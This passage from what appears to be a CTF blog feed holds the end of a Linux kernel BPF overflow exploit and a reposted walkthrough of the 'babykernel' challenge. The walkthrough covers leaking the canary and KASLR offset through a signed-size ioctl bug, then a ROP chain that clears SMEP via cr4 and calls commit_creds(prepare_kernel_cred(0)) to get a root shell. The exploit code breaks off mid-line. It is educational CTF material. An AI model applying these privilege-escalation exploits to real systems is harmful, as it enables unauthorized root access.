class="number">0x200011e6</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e7</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e8</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011e9</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011ea</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint8_t</span>*)<span class="number">0x200011eb</span> = <span class="number">0</span>;</span><br><span class="line">  save_state();</span><br><span class="line">  prepare_krop();</span><br><span class="line">  res = syscall(__NR_bpf, <span class="number">0</span>, <span class="number">0x200011c0</span>, <span class="number">0x2c</span>);</span><br><span class="line">  <span class="keyword">if</span> (res != <span class="number">-1</span>)</span><br><span class="line">    r[<span class="number">0</span>] = res;</span><br><span class="line">  spray();</span><br><span class="line"></span><br><span class="line">  *(<span class="keyword">uint32_t</span>*)<span class="number">0x200000c0</span> = r[<span class="number">0</span>];</span><br><span class="line">  *(<span class="keyword">uint64_t</span>*)<span class="number">0x200000c8</span> = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">uint64_t</span>*)<span class="number">0x200000d0</span> = <span class="number">0x20000140</span>;</span><br><span class="line">  *(<span class="keyword">uint64_t</span>*)<span class="number">0x200000d8</span> = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">uint64_t</span>* ptr = (<span class="keyword">uint64_t</span>*)<span class="number">0x20000140</span>;</span><br><span class="line">  ptr[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">  ptr[<span class="number">1</span>]=<span class="number">2</span>;</span><br><span class="line">  ptr[<span class="number">2</span>]=<span class="number">3</span>;</span><br><span class="line">  ptr[<span class="number">3</span>]=<span class="number">4</span>;</span><br><span class="line">  ptr[<span class="number">4</span>]=<span class="number">5</span>;</span><br><span class="line">  ptr[<span class="number">5</span>]=<span class="number">6</span>;</span><br><span class="line">  ptr[<span class="number">6</span>]=<span class="number">0xa000000000</span>;</span><br><span class="line">  ptr[<span class="number">7</span>]=<span class="number">8</span>;</span><br><span class="line">  syscall(__NR_bpf, <span class="number">2</span>, <span class="number">0x200000c0</span>, <span class="number">0x20</span>);</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x7000</span>) = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x6000</span>) = <span class="number">0</span>;</span><br><span class="line">  *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x5000</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;SPRAY_NUMBER;i++)&#123;</span><br><span class="line">      close(victim[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//pause();</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考文献：</p><p><a href="http://p4nda.top/2019/01/02/kernel-bpf-overflow/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90" target="_blank" rel="noopener">P4nda 师傅</a></p><p><a href="https://www.anquanke.com/post/id/166819#h3-5" target="_blank" rel="noopener">原作者 ww9210师傅</a></p><p><a href="https://github.com/ww9210/kernel4.20_bpf_LPE" target="_blank" rel="noopener">ww9210 师傅的 github</a></p><p><a href="https://www.kernel.org/doc/html/latest/bpf/index.html" target="_blank" rel="noopener">bpf</a></p>]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;font size=&quot;5&quot;&gt;info&lt;/font&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="https://leave-Devour.github.io/categories/Pwn/"/>
    
    
      <category term="kernel" scheme="https://leave-Devour.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>(转载自360安全客)从高校战疫的两道kernel学习kernel</title>
    <link href="https://leave-devour.github.io/2020/03/14/(%E8%BD%AC%E8%BD%BD%E8%87%AA360%E5%AE%89%E5%85%A8%E5%AE%A2)%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%9A%84%E4%B8%A4%E9%81%93kernel/"/>
    <id>https://leave-devour.github.io/2020/03/14/(%E8%BD%AC%E8%BD%BD%E8%87%AA360%E5%AE%89%E5%85%A8%E5%AE%A2)%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%9A%84%E4%B8%A4%E9%81%93kernel/</id>
    <published>2020-03-13T17:43:29.000Z</published>
    <updated>2020-03-27T03:58:22.751Z</updated>
    
    <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a>这次比赛的两道kernel题，解包都可以获得flag，而且跟网上最流行的两道联系的题是如此的类似似。比赛的时候没有看，赛后复现了这两道题。<h2 id="1、babykernel"><a href="#1、babykernel" class="headerlink" title="1、babykernel"></a>1、babykernel</h2><h3 id="go"><a href="#go" class="headerlink" title="go"></a>go</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">badyhacker.ko</span><br><span class="line">bzImage</span><br><span class="line">initramfs.cpio</span><br><span class="line">startvm.sh</span><br></pre></td></tr></table></figure><p>只有这四个文件，vmlinux可以从bzImage提取出来<br>startvm.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#stty intr ^]</span></span><br><span class="line"><span class="comment">#cd `dirname $0`</span></span><br><span class="line">timeout --foreground 15 qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append <span class="string">'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr'</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd initramfs.cpio \</span><br><span class="line">    -smp cores=2,threads=4 \</span><br><span class="line">    -cpu qemu64,smep,smap 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>文件开了 smep和smap 保护<br>一个是内核不能访问用户空间的数据<br>一个是内核不能执行用户空间的代码 // 这个可以通过修改rc4寄存器的值改变<br>同时 也开了 kaslr 这个可以通过偏移和泄露来计算<br>系统开了计时，只有15秒。调试的时候得去掉。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cpio -idmv &lt; initramfs.cpio</span><br><span class="line"></span><br><span class="line">bin  etc   gen_cpio.sh  init            linuxrc  sbin  tmp</span><br><span class="line">dev  flag  home         initramfs.cpio  proc     sys   usr</span><br></pre></td></tr></table></figure><p>一般的配置文件都放 <code>etc/init.d</code> 的rcS文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">───────┬───────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: rcS</span><br><span class="line">───────┼───────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ <span class="comment">#!/bin/sh</span></span><br><span class="line">   2   │ </span><br><span class="line">   3   │ mount -t proc none /proc</span><br><span class="line">   4   │ mount -t devtmpfs none /dev</span><br><span class="line">   5   │ mkdir /dev/pts</span><br><span class="line">   6   │ mount /dev/pts</span><br><span class="line">   7   │ </span><br><span class="line">   8   │ insmod /home/pwn/babyhacker.ko</span><br><span class="line">   9   │ chmod 644 /dev/babyhacker</span><br><span class="line">  10   │ <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">  11   │ <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">  12   │ </span><br><span class="line">  13   │ <span class="built_in">cd</span> /home/pwn</span><br><span class="line">  14   │ chown -R root /flag</span><br><span class="line">  15   │ chmod 400 /flag</span><br><span class="line">  16   │ </span><br><span class="line">  17   │ </span><br><span class="line">       │ File: rcS</span><br><span class="line">───────┼───────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ <span class="comment">#!/bin/sh</span></span><br><span class="line">   2   │ </span><br><span class="line">   3   │ mount -t proc none /proc</span><br><span class="line">   4   │ mount -t devtmpfs none /dev</span><br><span class="line">   5   │ mkdir /dev/pts</span><br><span class="line">   6   │ mount /dev/pts</span><br><span class="line">   7   │ </span><br><span class="line">   8   │ insmod /home/pwn/babyhacker.ko</span><br><span class="line">   9   │ chmod 644 /dev/babyhacker</span><br><span class="line">  10   │ <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">  11   │ <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">  12   │ </span><br><span class="line">  13   │ <span class="built_in">cd</span> /home/pwn</span><br><span class="line">  14   │ chown -R root /flag</span><br><span class="line">  15   │ chmod 400 /flag</span><br><span class="line">  16   │ </span><br><span class="line">  17   │ </span><br><span class="line">  18   │ chown -R 1000:1000 .</span><br><span class="line">  19   │ setsid cttyhack setuidgid 1000 sh</span><br><span class="line">  20   │ </span><br><span class="line">  21   │ umount /proc</span><br><span class="line">  22   │ poweroff -f</span><br></pre></td></tr></table></figure><p>容易看出系统加载了 babyhacker.ko 这个驱动<br><code>kptr_restrict</code> 和 <code>dmesg_restrict</code> 都为0<br>变量kptr_restrict是可以用来限制内核地址的打印，当kptr_restrict=0时，会直接打印内核地址（%p和%pK效果一样）；当kptr_restrict=1时，若在中断上下文或软中断时，%pK打印“pK-error”，否则内核地址打印全0；当kptr_restrict=2时，%pK打印内核地址为全0；<br>dmesg能够输出kernel ring buffer中的内容，这些内容中可能会包含一些敏感信息<br>我们可以通过设置内核参数 dmesg_restrict 为 1 的方式来禁止普通用户查看demsg信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /proc/kallsyms | grep commit_cr</span><br><span class="line">ffffffff810a1430 T commit_creds</span><br><span class="line"></span><br><span class="line">/ $ cat /proc/kallsyms | grep prepare_kernel_cred</span><br><span class="line">ffffffff810a1820 T prepare_kernel_cred</span><br><span class="line"></span><br><span class="line">commit_creds(prepare_kernel_cred(0))达到提权的效果</span><br></pre></td></tr></table></figure><p>在babyhacker_ioctl出现bug，size改成负数，可以越界访问</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  v9 = v3;</span><br><span class="line">  v5 = (<span class="keyword">signed</span> __int16)rdx1;</span><br><span class="line">  v8 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">switch</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30001</span>u:</span><br><span class="line">      read(rdx1, *(__int64 *)&amp;cmd, (<span class="keyword">unsigned</span> __int64)rdx1, (__int64)&amp;v9);<span class="comment">// 从用户读</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30002</span>u:</span><br><span class="line">      copy_to_user(rdx1, v4, buffersize);<span class="comment">//写给用户</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30000</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)rdx1 &gt;= <span class="number">0xB</span> ) <span class="meta"># this</span></span><br><span class="line">        v5 = <span class="number">10</span>;</span><br><span class="line">      buffersize = v5;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">.text:<span class="number">000000000000009</span>D                 cmp     edx, <span class="number">0B</span>h</span><br><span class="line">.text:<span class="number">00000000000000</span>A0                 mov     eax, <span class="number">0</span>Ah</span><br><span class="line">.text:<span class="number">00000000000000</span>A5                 cmovge  edi, eax</span><br><span class="line">.text:<span class="number">00000000000000</span>A8                 mov     cs:buffersize, di <span class="comment">//16位的</span></span><br><span class="line">.text:<span class="number">00000000000000</span>AF                 jmp     <span class="keyword">short</span> loc_8A</span><br></pre></td></tr></table></figure><p>说明负数后面的的两个字节是决定size</p><p>读写都有了，然后又可以越界，那是不是可以rop了。真爽！</p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>先把 kaslr关了<br>找打驱动加载的基地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ $ lsmod</span><br><span class="line">babyhacker 2104 0 - Live 0xffffffffc0000000 (OE)</span><br></pre></td></tr></table></figure><p>先构造 size，看看canary在哪个位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">save_status();</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/dev/babyhacker"</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"fd error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">getchar();</span><br><span class="line">ioctl(fd,<span class="number">0x30000</span>,<span class="number">0x80000100</span>);</span><br><span class="line"><span class="keyword">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">ioctl(fd,<span class="number">0x30002</span>,buf);</span><br><span class="line"><span class="keyword">size_t</span> * buf_c = (<span class="keyword">size_t</span> *)buf;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="number">0x50</span>;i++)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"idx:%d value:0x%lx\n"</span>,i,buf_c[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在调试的时候可以getchar()截住下面程序，让程序进入等待状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">idx:0 value:0xffffc90000135288</span><br><span class="line">idx:1 value:0xffff88001db1a980</span><br><span class="line">idx:2 value:0xffff88001d4e6200</span><br><span class="line">idx:3 value:0xffff88001db15cd8</span><br><span class="line">idx:4 value:0x24280ca</span><br><span class="line">idx:5 value:0x0</span><br><span class="line">idx:6 value:0x7fffffffffffffff</span><br><span class="line">idx:7 value:0xfff</span><br><span class="line">idx:8 value:0xe11d5dc4776f2cbf</span><br><span class="line">idx:9 value:0x943891</span><br><span class="line">idx:10 value:0x0</span><br><span class="line">idx:11 value:0xffff88001db1a980</span><br><span class="line">idx:12 value:0xffffffff810c31d0</span><br><span class="line">idx:13 value:0xdead000000000100</span><br><span class="line">idx:14 value:0xdead000000000200</span><br><span class="line">idx:15 value:0xe11d5dc4776f2cbf</span><br><span class="line">idx:16 value:0xffff88001db15c00</span><br><span class="line">idx:17 value:0xfffffffffffffffb</span><br><span class="line">idx:18 value:0xffff88001e3b21a8</span><br><span class="line">idx:19 value:0xffff88001d4e6200</span><br><span class="line">idx:20 value:0xffffffff814e5716</span><br><span class="line">idx:21 value:0xffff88001d4e3e40</span><br><span class="line">idx:22 value:0xffffffff814dd676</span><br><span class="line">idx:23 value:0xffff88001e059350</span><br><span class="line">idx:24 value:0x943890</span><br><span class="line">idx:25 value:0xffff88001d4e6200</span><br><span class="line">idx:26 value:0xffff88001d4e3f18</span><br></pre></td></tr></table></figure><p>随便找个断点下，能断下就OK</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">└─[0] &lt;&gt; gdb vmlinux </span><br><span class="line">pwndbg: loaded 180 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span><br><span class="line">Reading symbols from vmlinux...(no debugging symbols found)...done.</span><br><span class="line">pwndbg&gt; add-symbol-file ./</span><br><span class="line">.gdb_history    bzImage         initramfs.cpio  startvm.sh      </span><br><span class="line">babyhacker.ko   core/           rop.txt         vmlinux         </span><br><span class="line">pwndbg&gt; add-symbol-file ./</span><br><span class="line">.gdb_history    bzImage         initramfs.cpio  startvm.sh      </span><br><span class="line">babyhacker.ko   core/           rop.txt         vmlinux         </span><br><span class="line">pwndbg&gt; add-symbol-file babyhacker.ko 0xffffffffc0000000</span><br><span class="line">add symbol table from file &quot;babyhacker.ko&quot; at</span><br><span class="line">.text_addr = 0xffffffffc0000000</span><br><span class="line">Reading symbols from babyhacker.ko...done.</span><br><span class="line">pwndbg&gt; b *0xffffffffc0000000+0x35</span><br><span class="line">Breakpoint 1 at 0xffffffffc0000035: file /home/zoe/Desktop/kernel_pwn/myko/babyhacker.c, line 50.</span><br><span class="line">pwndbg&gt; target remote :1234</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RBP  0xffff88001d4e3d40 ◂— 0</span><br><span class="line">RSP  0xffff88001d4e3bf8 ◂— 0</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/20xg 0xffff88001d4e3d40-0x8</span><br><span class="line">0xffff88001d4e3d38:0xe11d5dc4776f2cbf0x0000000000000000</span><br><span class="line">可以看出 0xe11d5dc4776f2cbf 找个就是 canary</span><br><span class="line">然后 可以利用其它的内核地址就可以 得出offset 就用绕过kaslr</span><br></pre></td></tr></table></figure><p>既然知道 canary，下面就是找出偏移</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000000B8                 lea     cmd, [rbp-148h]</span><br><span class="line">.text:00000000000000BF                 call    _copy_to_user</span><br><span class="line">所以整个数组大小应该是140byte</span><br><span class="line">rbp前面就是canary</span><br></pre></td></tr></table></figure><h3 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h3><p>做内核题，一般少不了对程序状态的保存<br>因为在用户空间返回内核空间的是时候要恢复状态，就有点像中断进入内核，然后保存状态。出来再把状态恢复。<br>因为要改rc4，肯定少不了 <code>pop rdi; ret;</code>和<code>mov cr4, rdi; pop rbp; ret;</code> 这两条执行。</p><p>从用户空间回到内核空间需要 <code>swapgs</code> 和 <code>iretq</code><br>具体流程就是：<br>修改size<br>读取数据找到cananry和offset<br>写rop<br>exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>))) (*_commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (*_prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line">_commit_creds commit_creds =<span class="number">0xffffffff810a1430</span>;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred =<span class="number">0xffffffff810a1820</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"suceess\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"get shell fail"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">    <span class="string">"mov user_cs, cs;"</span></span><br><span class="line">    <span class="string">"mov user_ss, ss;"</span></span><br><span class="line">    <span class="string">"mov user_sp, rsp;"</span></span><br><span class="line">    <span class="string">"pushf;"</span></span><br><span class="line">    <span class="string">"pop user_rflags"</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] status has been saved\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> pop_rdi = <span class="number">0xffffffff8109054d</span>,pop_rdx =<span class="number">0xffffffff81083f22</span>;</span><br><span class="line"><span class="keyword">size_t</span> pop_rcx = <span class="number">0xffffffff81006ffc</span>,mov_rc4_pop_ret = <span class="number">0xffffffff81004d70</span>;</span><br><span class="line"><span class="keyword">size_t</span> swapgs = <span class="number">0xffffffff810636b4</span>,iretq_ret = <span class="number">0xffffffff81478294</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/babyhacker"</span>,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"fd error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">    ioctl(fd,<span class="number">0x30000</span>,<span class="number">0x80000100</span>);</span><br><span class="line">    <span class="keyword">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    ioctl(fd,<span class="number">0x30002</span>,buf);</span><br><span class="line">    <span class="keyword">size_t</span> * buf_c = (<span class="keyword">size_t</span> *)buf;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="number">0x50</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"idx:%d value:0x%lx\n"</span>,i,buf_c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> canary = buf_c[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">size_t</span> offset = <span class="number">0xffffffff810c31d0</span> -  buf_c[<span class="number">12</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]canary:0x%lx\n"</span>,canary);</span><br><span class="line">    commit_creds += offset;</span><br><span class="line">    prepare_kernel_cred += offset;</span><br><span class="line">    pop_rdi +=offset;</span><br><span class="line">    iretq_ret += offset;</span><br><span class="line">    mov_rc4_pop_ret += offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] commit_cred: 0x%lx\n"</span>,commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] prepare_kernel_cred : 0x%lx\n"</span>,prepare_kernel_cred);</span><br><span class="line">    ioctl(fd,<span class="number">0x30000</span>,<span 